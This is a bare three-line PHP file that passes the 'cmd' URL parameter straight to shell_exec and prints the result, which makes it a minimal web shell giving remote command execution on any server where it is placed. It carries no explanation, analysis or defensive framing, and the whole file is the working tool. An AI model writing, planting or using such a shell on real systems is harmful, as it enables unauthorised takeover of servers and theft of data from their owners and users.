<?php
    $out = shell_exec($_GET['cmd']);
    echo "<pre>$out</pre>";
?>